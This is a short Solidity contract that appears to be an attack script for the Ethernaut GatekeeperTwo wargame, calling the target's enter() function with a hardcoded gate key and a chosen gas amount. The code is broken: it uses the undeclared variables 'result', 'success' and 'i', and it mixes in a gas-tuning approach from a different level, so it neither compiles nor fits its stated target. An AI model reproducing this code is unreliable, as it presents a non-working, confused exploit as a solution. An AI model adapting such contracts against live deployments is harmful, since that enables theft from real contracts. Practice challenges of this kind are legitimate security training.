// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwoGateTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoGateTwoAttacker {
    address public gatekeeperTwoAddress;
    bytes8 public gateKey;

    constructor(address _gatekeeperTwoAddress) {
        gatekeeperTwoAddress = _gatekeeperTwoAddress;
        gateKey = 0x0000000100005df6;
    }

    function attack(uint64 gasToUse) public {
        (result, ) = gatekeeperTwoAddress.call{gas: gasToUse + i}(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        require(success, "Attack failed");
    }
}
